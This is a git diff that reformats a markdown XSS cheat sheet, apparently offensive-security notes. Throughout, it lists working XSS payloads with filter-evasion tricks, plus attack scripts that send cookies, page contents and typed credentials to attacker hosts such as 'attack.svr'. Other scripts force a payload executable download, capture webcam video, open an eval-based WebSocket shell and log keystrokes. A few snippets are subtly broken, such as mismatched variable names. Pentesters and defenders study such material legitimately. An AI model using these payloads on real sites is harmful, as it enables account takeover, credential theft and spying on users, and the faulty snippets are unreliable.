@@ -1,19 +1,20 @@
-Cross Site Scripting (XSS)
-==========================
+# Cross Site Scripting (XSS)
 
-Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendered by the browser. 
+Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendered by the browser.
 
 ## Identification Payloads
 
 ### Polyglots
 
+XSS polyglots are specially crafted javascript like strings made up of various vectors designed to trigger XSS vulnerabilities under different conditions. Often they are a quick way to identify more simplistic XSS vulnerabilities and can be tried 'everywhere' as a first test payload.
+
 ```javascript
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript: /*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/ [] /
+	+alert(1); //'>
 ```
 
-
 ```javascript
-jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+jaVasCript: /*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/ /* */ oNcliCk = alert(); //</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
 ```
 
 ### Basic Payloads
@@ -88,7 +89,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### Grave Accent Obfuscation
 
-+ Hide double and single quotes from filter with grave accent wrapping
+-   Hide double and single quotes from filter with grave accent wrapping
 
 ```javascript
 <IMG SRC=`javascript:alert("Hello, 'XSS'")`>
@@ -114,12 +115,11 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### UTF8 Normalisation
 
-+ If the target attempts UTF8 normalisation it may be possible to circumvent a filter by replacing parts of a typical payload, like `<>` with UTF8 equivalents. When they are normalized they will become regular `<>` characters exposing the potential for XSS. 
+-   If the target attempts UTF8 normalisation it may be possible to circumvent a filter by replacing parts of a typical payload, like `<>` with UTF8 equivalents. When they are normalized they will become regular `<>` characters exposing the potential for XSS.
 
 ```js
 ＜/p＞＜img src="x" onⅇrror="console.log(1)"/＞
 ```
-
 
 ### DOM Event Based Payloads
 
@@ -163,7 +163,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### OnKeyDown
 
-
 ```js
 <body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
 ```
@@ -176,14 +175,13 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 ### Encoded Payloads
 
-
-+ alert encode
+-   alert encode
 
 ```
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 ```
 
-+ HTML Decimal Character References
+-   HTML Decimal Character References
 
 ```
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
@@ -193,7 +191,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 ```
 
-+ HTML Hexadecimal Character References
+-   HTML Hexadecimal Character References
 
 ```
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
@@ -201,28 +199,28 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 ### JSONP Payloads
 
-+ JSONP callbacks can be weaponised in certain circumstances to get XSS
-+ JSONP based XSS vectors also have a high chance of negating CSP protections making them an exceptionally useful vulnerability
-+ *Note: the following payloads are designed to be injected into any part of a web application which uses a JSONP endpoint, they can also be injected into the callback of a legitimate JSONP query*
-	+ For example: `domain.com/page?query=PAYLOAD`
+-   JSONP callbacks can be weaponised in certain circumstances to get XSS
+-   JSONP based XSS vectors also have a high chance of negating CSP protections making them an exceptionally useful vulnerability
+-   _Note: the following payloads are designed to be injected into any part of a web application which uses a JSONP endpoint, they can also be injected into the callback of a legitimate JSONP query_
+    -   For example: `domain.com/page?query=PAYLOAD`
 
 #### Basic JSONP Payloads
 
 ```js
-<script src="https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);"></script>
+<script src='https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);'></script>
 ```
 
 ### Image/File Upload Based Payloads
 
 #### File Name Injection
 
-+ Upload a file like
+-   Upload a file like
 
 ```javascript
 ""><img src=x onerror=alert(1)>.gif
 ```
 
-#### SVG 
+#### SVG
 
 ```javascript
 <?xml version="1.0" standalone="no"?>
@@ -238,7 +236,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### File Metadata
 
-*These can be embeded with exiftool and hence an example command for doing so is included.*
+_These can be embeded with exiftool and hence an example command for doing so is included._
 
 ```javascript
 “><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg
@@ -251,7 +249,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 #### GIF
 
 `GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;`
-
 
 ### mXSS
 
@@ -266,31 +263,31 @@ JS code for embedding in exploit payloads.
 ### Phishing Redirect
 
 ```javascript
-window.location='https://attackerphishingsite.com'
+window.location = 'https://attackerphishingsite.com';
 ```
 
 ```javascript
-window['location']='https://attackerphishingsite.com'
+window['location'] = 'https://attackerphishingsite.com';
 ```
 
 ```javascript
-document.location='https://attackerphishingsite.com'
+document.location = 'https://attackerphishingsite.com';
 ```
 
 ### Exfiltrate Auth Tokens/Cookies
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 ```javascript
-fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
+fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}');
 ```
 
 ```javascript
-window.location = "http://attack.svr?stolen_token=" + document.cookie;
+window.location = 'http://attack.svr?stolen_token=' + document.cookie;
 ```
 
 ```javascript
-window['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
+window['location'] = 'http://attack.svr?stolen_token=' + document['cookie'];
 ```
 
 ```javascript
@@ -298,11 +295,13 @@ document.location = "http://attack.svr?stolen_token=" + document.cookie";
 ```
 
 ```javascript
-document['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
+document['location'] = 'http://attack.svr?stolen_token=' + document['cookie'];
 ```
 
 ```javascript
-let req = new XMLHttpRequest();res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);req.send();
+let req = new XMLHttpRequest();
+res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);
+req.send();
 ```
 
 ```javascript
@@ -311,17 +310,16 @@ document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 
 ### Grab Protected Pages
 
-
 ```javascript
 fetch('/protected_page')
-	.then(page => page.text())
-	.then(text => {
+	.then((page) => page.text())
+	.then((text) => {
 		fetch('attack.domain.com', {
 			method: 'POST',
 			headers: { 'Content-Type': 'application/json' },
-			body: JSON.stringify({page:text})
-		})
-	})
+			body: JSON.stringify({ page: text }),
+		});
+	});
 ```
 
 ```javascript
@@ -330,18 +328,28 @@ javascript:fetch("https://victim.com/page").then(a => {a.text().then(b)=>fetch("
 
 ### Grab Specific Page Data
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 #### Page Area {div, span, etc}
 
 ```javascript
-fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textContent))
+fetch(
+	'attacker.domain.com?data=' +
+		encodeURIComponent(
+			document.querySelector('.hmtlClassElmentToSteal').textContent
+		)
+);
 ```
 
 #### Input Field/Text Area
 
 ```javascript
-fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textValue))
+fetch(
+	'attacker.domain.com?data=' +
+		encodeURIComponent(
+			document.querySelector('.hmtlClassElmentToSteal').textValue
+		)
+);
 ```
 
 ### Grab Screenshots
@@ -349,7 +357,7 @@ fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.
 ```javascript
 <script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js>
 html2canvas(document.body)
-	.then(canvas => 
+	.then(canvas =>
 			fetch('attack.domain.com', {
 					method: 'POST',
 					headers: { 'Content-Type': 'application/json' }
@@ -361,14 +369,14 @@ html2canvas(document.body)
 
 ### Forced Download
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 #### Macro Document
 
 ```javascript
-frame = document.createElement('iframe')
-frame.src = 'attack.domain.com/payloadDocument.docx'
-document.body.appendChild(frame)
+frame = document.createElement('iframe');
+frame.src = 'attack.domain.com/payloadDocument.docx';
+document.body.appendChild(frame);
 ```
 
 #### Executable File
@@ -377,20 +385,19 @@ document.body.appendChild(frame)
 <a href=/executable.exe download=executable.exe onclick="if(window.el){return;}el=this;
 	fetch('attack.domain.com/payload.exe')
 		.then(resp => resp.blob())
-		.then(blob => 
+		.then(blob =>
 			{
 				el.href=window.URL.createObjectURL(blob); el.click()
 			});
-			
+
 			return false">
 			Social Engineering TXT here
 </a>
 ```
 
-
 ### Capture Data From Webcam
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 ```js
 vid_element = document.createElement('video')
@@ -415,16 +422,16 @@ navigator.mediaDevices.getUserMedia({video:true})
 
 ### Reverse Shell
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 ```js
-sock = new WebSocket('wss://attack.domain.com')
-sock.onmessage = event => eval(e.data)
+sock = new WebSocket('wss://attack.domain.com');
+sock.onmessage = (event) => eval(e.data);
 ```
 
 ### Run Keylogger
 
-*For use with an [exfiltration/attack server](#exfiltration-servers)*
+_For use with an [exfiltration/attack server](#exfiltration-servers)_
 
 ```js
 document.addEventListener('change', element => {
@@ -440,18 +447,18 @@ document.addEventListener('change', element => {
 ### Steal Saved Browser Credentials
 
 ```js
-form = document.createElement('form')
-usr_name = document.createElement('input')
-usr_name.setAttribute('type', 'text')
-usr_name.setAttribute('name', 'username')
+form = document.createElement('form');
+usr_name = document.createElement('input');
+usr_name.setAttribute('type', 'text');
+usr_name.setAttribute('name', 'username');
 
-password = document.createElement('input')
-password.setAttribute('type', 'password')
-password.setAttribute('name', 'password')
+password = document.createElement('input');
+password.setAttribute('type', 'password');
+password.setAttribute('name', 'password');
 
-form.appendChild(usr_name)
-form.appendChild(password)
-document.body.appendChild(form)
+form.appendChild(usr_name);
+form.appendChild(password);
+document.body.appendChild(form);
 document.addEventlistener('click', () =>
 	fetch(`attack.domain.com?usr=${usr_name.value}pass=${password.value}`)
 );
@@ -459,25 +466,23 @@ document.addEventlistener('click', () =>
 
 ## Exfiltration Servers
 
-This section aims to document several approaches to setting up an attack server for XSS exfiltration 
+This section aims to document several approaches to setting up an attack server for XSS exfiltration
 
-+ [AWS EC2 Instance](https://us-east-2.console.aws.amazon.com/ec2/)
-+ [Pipedream.com](https://pipedream.com)
-+ [Ngrok](https://ngrok.com/)
-+ [Digital Ocean Droplets](https://cloud.digitalocean.com/droplets) 
-
+-   [AWS EC2 Instance](https://us-east-2.console.aws.amazon.com/ec2/)
+-   [Pipedream.com](https://pipedream.com)
+-   [Ngrok](https://ngrok.com/)
+-   [Digital Ocean Droplets](https://cloud.digitalocean.com/droplets)
 
 ## Debugging Payloads & Pitfalls
-
 
 If your payload doesn't work after finding a injection point vulnerable to a basic test these are some common reasons payloads fail
 
 #### Browser/Web Application Encoding
 
-+ More built out payloads which contain urls and additional JS code generally contain a number of characters which browsers and 
-parts of web applications interpret as delimiters or other characters
-+ A common example of this is when injecting payloads into felids on a web app or the address bar which contain the `+` character commonly used to concatenate strings in JS,
-the `+` character in many cases will be 'transformed' into a `space` character consequently breaking the JS syntax and your payload
+-   More built out payloads which contain urls and additional JS code generally contain a number of characters which browsers and
+    parts of web applications interpret as delimiters or other characters
+-   A common example of this is when injecting payloads into felids on a web app or the address bar which contain the `+` character commonly used to concatenate strings in JS,
+    the `+` character in many cases will be 'transformed' into a `space` character consequently breaking the JS syntax and your payload
 
 ##### Common 'Bad/interpreted Characters'
 
@@ -494,73 +499,72 @@ the `+` character in many cases will be 'transformed' into a `space` character c
 
 **Checking Character Encoding**
 
-+ In Burpsuite use the decoder tab
-+ Python3 `$ python3 >> hex(ord("char"))`
-	+ To check `"` use `\"`
+-   In Burpsuite use the decoder tab
+-   Python3 `$ python3 >> hex(ord("char"))`
+    -   To check `"` use `\"`
 
 #### Exploit Works Locally (My browser) but Not On Other Users
 
-+ Sometimes XSS payloads which work from the injected browsers perspective do not trigger when sent to a victim
-+ This can occur due to browser type
-	+ Chrome
-	+ Safari
-	+ Edge
-	+ Firefox
-+ Browser version
-+ Browser plugins
+-   Sometimes XSS payloads which work from the injected browsers perspective do not trigger when sent to a victim
+-   This can occur due to browser type
+    -   Chrome
+    -   Safari
+    -   Edge
+    -   Firefox
+-   Browser version
+-   Browser plugins
 
 ###### Workarounds
 
-+ Test payloads on other browsers
-+ **Try alternative JS syntax**
-+ Try alternative HTML tags/attributes
-+ Check W3C and other online resources to see what browsers support elements of your payload
+-   Test payloads on other browsers
+-   **Try alternative JS syntax**
+-   Try alternative HTML tags/attributes
+-   Check W3C and other online resources to see what browsers support elements of your payload
 
 ### General Tips
 
-+ Inject payloads through burp where possible to observe if they are encoded correctly
-+ Check the dev console after injecting a payload
-	+ Look for CSP blocks
-	+ Syntax errors
-+ Check the DOMs interpretation of the payload with inspect/view source
+-   Inject payloads through burp where possible to observe if they are encoded correctly
+-   Check the dev console after injecting a payload
+    -   Look for CSP blocks
+    -   Syntax errors
+-   Check the DOMs interpretation of the payload with inspect/view source
 
 ### Unsorted Workarounds
 
-+ Try double URL encoding bad characters
-+ Base 64 encode long strings and then use the JS `atob(string)` in the payload body to decode the string back to plain text 
-+ Add or remove `;//` after url strings 
+-   Try double URL encoding bad characters
+-   Base 64 encode long strings and then use the JS `atob(string)` in the payload body to decode the string back to plain text
+-   Add or remove `;//` after url strings
 
 ## Finding and Exploiting XSS
 
 #### DOM Based XSS
 
-- [ ] Do forms/fields on the web app return user entered data on the page?
-- [ ] How does the form/field handle control characters? Does the application error?
-- [ ] Are control characters encoded, escaped, filtered, blocked or rendered?
-- [ ] Does any kind of filter evasion yield variations?
+-   [ ] Do forms/fields on the web app return user entered data on the page?
+-   [ ] How does the form/field handle control characters? Does the application error?
+-   [ ] Are control characters encoded, escaped, filtered, blocked or rendered?
+-   [ ] Does any kind of filter evasion yield variations?
 
 #### Reflected XSS
 
-- [ ] Are felids/forms processed by the web application before the response is supplied to the client/frontend?
-- [ ] Is the form validated on the front end?
-- [ ] Can form validation be bypassed?
-- [ ] How does the server respond to control characters supplied to the felid/form?
-- [ ] Are control characters encoded, escaped, filtered, blocked or rendered in the return data?
-- [ ] Does any kind of filter evasion yield variations?
+-   [ ] Are felids/forms processed by the web application before the response is supplied to the client/frontend?
+-   [ ] Is the form validated on the front end?
+-   [ ] Can form validation be bypassed?
+-   [ ] How does the server respond to control characters supplied to the felid/form?
+-   [ ] Are control characters encoded, escaped, filtered, blocked or rendered in the return data?
+-   [ ] Does any kind of filter evasion yield variations?
 
 #### Stored XSS
 
-- [ ] Does user/client controlled field/form data get stored by the server for use in rendering content on the web application?
-- [ ] Is the form validated on the front end?
-- [ ] Can form validation be bypassed?
-- [ ] How does the server respond to control characters supplied to the felid/form?
-- [ ] How does the frontend render client data injected with control characters, are they stripped, malformed, encoded or rendered?
-- [ ] Does any kind of filter evasion yield variations?  
-
+-   [ ] Does user/client controlled field/form data get stored by the server for use in rendering content on the web application?
+-   [ ] Is the form validated on the front end?
+-   [ ] Can form validation be bypassed?
+-   [ ] How does the server respond to control characters supplied to the felid/form?
+-   [ ] How does the frontend render client data injected with control characters, are they stripped, malformed, encoded or rendered?
+-   [ ] Does any kind of filter evasion yield variations?
 
 ## Resources
 
-+ [Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection)
-+ [OSWAP Cheat-sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
-+ [GBHackers Top 500 XSS Cheat sheet](https://gbhackers.com/top-500-important-xss-cheat-sheet/)
-+ [Chef Secure](https://www.youtube.com/channel/UCqx-vnWwxXQEJ0TC5a6vuNw)
+-   [Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection)
+-   [OSWAP Cheat-sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+-   [GBHackers Top 500 XSS Cheat sheet](https://gbhackers.com/top-500-important-xss-cheat-sheet/)
+-   [Chef Secure](https://www.youtube.com/channel/UCqx-vnWwxXQEJ0TC5a6vuNw)
